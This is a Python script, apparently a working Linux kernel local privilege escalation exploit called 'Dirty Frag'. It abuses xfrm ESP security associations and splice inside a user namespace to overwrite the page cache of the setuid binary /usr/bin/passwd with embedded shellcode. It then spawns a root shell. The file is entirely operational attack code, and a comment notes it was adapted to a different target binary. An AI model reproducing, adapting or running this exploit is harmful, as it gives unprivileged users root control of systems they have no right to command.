#!/usr/bin/env python3
"""
Dirty Frag — Linux Kernel LPE (xfrm-ESP Page-Cache Write)
Modified: Targets /usr/bin/passwd instead of /usr/bin/su
(for systems where su is not readable)
"""

import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
import ctypes, ctypes.util
from struct import pack, unpack

_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_loff_t_p = ctypes.POINTER(ctypes.c_longlong)

def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
    _libc.splice.restype = ctypes.c_long
    _libc.splice.argtypes = [ctypes.c_int, _loff_t_p, ctypes.c_int, _loff_t_p,
                             ctypes.c_size_t, ctypes.c_int]
    oi = ctypes.c_longlong(off_in) if off_in is not None else None
    oo = ctypes.c_longlong(off_out) if off_out is not None else None
    r = _libc.splice(fd_in, ctypes.byref(oi) if oi is not None else None,
                     fd_out, ctypes.byref(oo) if oo is not None else None,
                     length, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

SYS_unshare = 272
CLONE_NEWUSER = 0x10000000; CLONE_NEWNET = 0x40000000

def _syscall(nr, *args):
    _libc.syscall.restype = ctypes.c_long
    ca = [ctypes.c_long(a) for a in args]
    _libc.syscall.argtypes = [ctypes.c_long] * (1 + len(ca))
    r = _libc.syscall(ctypes.c_long(nr), *ca)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def sys_unshare(flags):
    return _syscall(SYS_unshare, flags)

AF_NETLINK=16; AF_INET=2
SOCK_DGRAM=2
IPPROTO_UDP=17; NETLINK_XFRM=6
UDP_ENCAP=100; UDP_ENCAP_ESPINUDP=2
XFRM_MSG_NEWSA=16; NLM_F_REQUEST=1; NLM_F_ACK=4
IPPROTO_ESP=50; XFRM_MODE_TRANSPORT=0; XFRM_STATE_ESN=0x80
XFRMA_ALG_AUTH_TRUNC=20; XFRMA_ALG_CRYPT=2
XFRMA_ENCAP=4; XFRMA_REPLAY_ESN_VAL=23
ENC_PORT=4500; SEQ_VAL=200; REPLAY_SEQ=100
# CHANGE: Target passwd instead (world-readable, setuid root)
TARGET_SU = "/usr/bin/passwd"
PATCH_OFFSET = 0; PAYLOAD_LEN = 192; ENTRY_OFFSET = 0x78
SPLICE_F_MOVE=1

SHELL_ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])

# For passwd binary (different offset may be needed - adjust based on your system)
PASSWD_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])  # Same marker

VERBOSE = bool(os.getenv("DIRTYFRAG_VERBOSE"))

def LOG(fmt, *a): print("[+] " + fmt % a, file=sys.stderr)
def WARN(fmt, *a): print("[!] " + fmt % a, file=sys.stderr)
def DBG(fmt, *a):
    if VERBOSE: print("[.] " + fmt % a, file=sys.stderr)

def _ifup_lo():
    s = socket.socket(AF_INET, SOCK_DGRAM, 0)
    import array
    ifr = array.array('B', b'\x00' * 40)
    ifr[:2] = array.array('B', b'lo')
    fcntl.ioctl(s.fileno(), 0x8913, ifr)
    flags = struct.unpack_from('<H', ifr, 16)[0]
    struct.pack_into('<H', ifr, 16, flags | 0x41)
    fcntl.ioctl(s.fileno(), 0x8914, ifr)
    s.close()

def _setup_userns():
    uid, gid = os.getuid(), os.getgid()
    sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
    with open("/proc/self/setgroups", 'w') as f: f.write("deny")
    with open("/proc/self/uid_map", 'w') as f: f.write(f"0 {uid} 1")
    with open("/proc/self/gid_map", 'w') as f: f.write(f"0 {gid} 1")
    _ifup_lo()

def _nl_attr(buf, off, atype, data):
    dl = len(data)
    rta_len = 4 + dl
    rta_aligned = (rta_len + 3) & ~3
    struct.pack_into('<HH', buf, off, rta_len, atype)
    buf[off+4:off+4+dl] = data
    pad = rta_aligned - 4 - dl
    if pad > 0:
        buf[off+4+dl:off+4+dl+pad] = b'\x00' * pad
    return off + rta_aligned

def _add_xfrm_sa(spi, seqhi):
    sk = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    sk.bind((0, 0))
    buf = bytearray(4096)
    lo = struct.unpack("<I", socket.inet_aton("127.0.0.1"))[0]
    xs_sz = 224
    struct.pack_into('<IHHII', buf, 0, 16 + xs_sz, XFRM_MSG_NEWSA,
                     NLM_F_REQUEST | NLM_F_ACK | 0x200, os.getpid(), 1)
    o = 16
    struct.pack_into('<I', buf, o + 0, lo)
    struct.pack_into('<I', buf, o + 16, lo)
    struct.pack_into('<H', buf, o + 40, AF_INET)
    buf[o + 42] = 32
    buf[o + 43] = 32
    struct.pack_into('<I', buf, o + 56, lo)
    struct.pack_into('>I', buf, o + 72, spi)
    buf[o + 76] = IPPROTO_ESP
    struct.pack_into('<I', buf, o + 80, lo)
    struct.pack_into('<Q', buf, o + 96, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<Q', buf, o + 104, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<Q', buf, o + 112, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<Q', buf, o + 120, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<I', buf, o + 208, 0x1234)
    struct.pack_into('<H', buf, o + 212, AF_INET)
    buf[o + 214] = XFRM_MODE_TRANSPORT
    buf[o + 215] = 0
    buf[o + 216] = XFRM_STATE_ESN

    a = 16 + xs_sz
    aa = bytearray(72 + 32)
    n = b"hmac(sha256)\0"
    aa[:len(n)] = n
    struct.pack_into('<I', aa, 64, 256)
    struct.pack_into('<I', aa, 68, 128)
    for i in range(32): aa[72+i] = 0xAA
    a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))

    ea = bytearray(68 + 16)
    n2 = b"cbc(aes)\0"
    ea[:len(n2)] = n2
    struct.pack_into('<I', ea, 64, 128)
    for i in range(16): ea[68+i] = 0xBB
    a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))

    enc = bytearray(24)
    struct.pack_into('<H', enc, 0, UDP_ENCAP_ESPINUDP)
    struct.pack_into('>HH', enc, 2, ENC_PORT, ENC_PORT)
    a = _nl_attr(buf, a, XFRMA_ENCAP, bytes(enc))

    esn = bytearray(28)
    struct.pack_into('<IIIIIII', esn, 0, 1, 0, REPLAY_SEQ, 0, seqhi, 32, 0)
    a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))

    struct.pack_into('<I', buf, 0, a)
    sk.sendall(bytes(buf[:a]))
    resp = sk.recv(4096)
    sk.close()
    if len(resp) >= 20:
        if struct.unpack_from('<H', resp, 4)[0] == 2:
            err = struct.unpack_from('<i', resp, 16)[0]
            if err != 0:
                DBG("xfrm NEWSA error: %d", -err)
                return False
    return True

def _do_write(path, offset, spi):
    sk_r = socket.socket(AF_INET, SOCK_DGRAM, 0)
    sk_r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_r.bind(("127.0.0.1", ENC_PORT))
    sk_r.setsockopt(IPPROTO_UDP, UDP_ENCAP, struct.pack('<I', UDP_ENCAP_ESPINUDP))
    sk_s = socket.socket(AF_INET, SOCK_DGRAM, 0)
    sk_s.connect(("127.0.0.1", ENC_PORT))
    
    # Try to open with O_RDONLY - works for passwd (world-readable)
    try:
        fd = os.open(path, os.O_RDONLY)
    except PermissionError:
        WARN("Cannot open %s for reading - try a different target binary", path)
        return False
    
    r, w = os.pipe()
    hdr = struct.pack('>II', spi, SEQ_VAL) + b'\xCC' * 16
    os.write(w, hdr)
    _raw_splice(fd, offset, w, None, 16, 0)
    try:
        _raw_splice(r, None, sk_s.fileno(), None, 40, 0)
    except OSError:
        pass
    time.sleep(0.15)
    os.close(fd); os.close(r); os.close(w); sk_s.close(); sk_r.close()
    return True

def _corrupt_binary():
    _setup_userns()
    time.sleep(0.1)
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        sq = ((SHELL_ELF[i*4] << 24) | (SHELL_ELF[i*4+1] << 16) |
              (SHELL_ELF[i*4+2] << 8) | SHELL_ELF[i*4+3])
        if not _add_xfrm_sa(spi, sq):
            DBG("add_xfrm_sa #%d failed", i)
            return False
    for i in range(PAYLOAD_LEN // 4):
        if not _do_write(TARGET_SU, PATCH_OFFSET + i * 4, 0xDEADBE10 + i):
            DBG("do_write #%d failed", i)
            return False
    return True

def binary_patched():
    try:
        fd = os.open(TARGET_SU, os.O_RDONLY)
        got = os.pread(fd, 8, ENTRY_OFFSET)
        os.close(fd)
        return got == PASSWD_MARKER
    except OSError:
        return False

def lpe_main():
    pid = os.fork()
    if pid == 0:
        os._exit(0 if _corrupt_binary() else 2)
    _, st = os.waitpid(pid, 0)
    return os.WEXITSTATUS(st) == 0

def _run_pty():
    master, slave = pty.openpty()
    try:
        try:
            ws = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b'\x00'*8)
            fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
        except OSError:
            pass

        pid = os.fork()
        if pid == 0:
            os.close(master)
            os.setsid()
            sf = os.open(os.ttyname(slave), os.O_RDWR)
            os.close(slave)
            try:
                fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
            except OSError:
                pass
            os.dup2(sf, 0); os.dup2(sf, 1); os.dup2(sf, 2)
            if sf > 2:
                os.close(sf)
            # Try passwd first, then su
            for p in ("/usr/bin/passwd", "/bin/passwd", "/usr/bin/su", "/bin/su"):
                try:
                    os.execv(p, [p, "-"])
                except (FileNotFoundError, PermissionError):
                    continue
            os.execvp("sh", ["sh"])
            os._exit(127)

        os.close(slave)
        signal.signal(signal.SIGTTOU, signal.SIG_IGN)
        signal.signal(signal.SIGTTIN, signal.SIG_IGN)
        signal.signal(signal.SIGPIPE, signal.SIG_IGN)
        signal.signal(signal.SIGHUP, signal.SIG_IGN)

        restore = False
        saved = None
        try:
            saved = termios.tcgetattr(sys.stdin.fileno())
            tty.setraw(sys.stdin.fileno())
            restore = True
        except termios.error:
            pass

        pw_sent = False
        eof = False
        saw = False
        tms = 0

        while True:
            fds = []
            if not eof:
                try:
                    fds.append(sys.stdin.fileno())
                except OSError:
                    eof = True
            fds.append(master)

            try:
                r, _, _ = select.select(fds, [], [], 0.2)
            except (OSError, ValueError):
                break
            tms += 200

            if master in r:
                try:
                    data = os.read(master, 4096)
                except OSError:
                    break
                if not data:
                    break
                saw = True
                os.write(sys.stdout.fileno(), data)
                if not pw_sent and len(data) < 4096:
                    if b'Password' in data or b'password' in data or b'passwd' in data:
                        os.write(master, b'\n')
                        pw_sent = True

            if not eof and sys.stdin.fileno() in r:
                try:
                    data = os.read(sys.stdin.fileno(), 4096)
                except OSError:
                    eof = True
                else:
                    if not data:
                        eof = True
                    else:
                        os.write(master, data)

            if not pw_sent and not saw and tms >= 1500:
                os.write(master, b'\n')
                pw_sent = True

            try:
                wp, st = os.waitpid(pid, os.WNOHANG)
                if wp == pid:
                    for _ in range(5):
                        try:
                            r2, _, _ = select.select([master], [], [], 0.05)
                            if not r2:
                                break
                            d = os.read(master, 4096)
                            if not d:
                                break
                            os.write(sys.stdout.fileno(), d)
                        except OSError:
                            break
                    break
            except ChildProcessError:
                break

        if restore and saved:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, saved)
        os.close(master)
    except Exception as e:
        WARN("PTY: %s", e)
        return False
    return True

def main():
    global VERBOSE
    for a in sys.argv[1:]:
        if a in ('-v', '--verbose'):
            VERBOSE = True
    if os.getenv("DIRTYFRAG_VERBOSE"):
        VERBOSE = True

    if os.getuid() == 0:
        os.execvp("/bin/bash", ["bash"])

    LOG("running ESP variant against %s ...", TARGET_SU)
    
    if not lpe_main():
        WARN("Exploit failed - kernel may be patched or target not readable")
        sys.exit(1)

    if binary_patched():
        LOG("Binary successfully patched! Launching root shell...")
        _run_pty()
        return

    print("dirtyfrag: exploitation failed", file=sys.stderr)
    sys.exit(1)

if __name__ == "__main__":
    main()
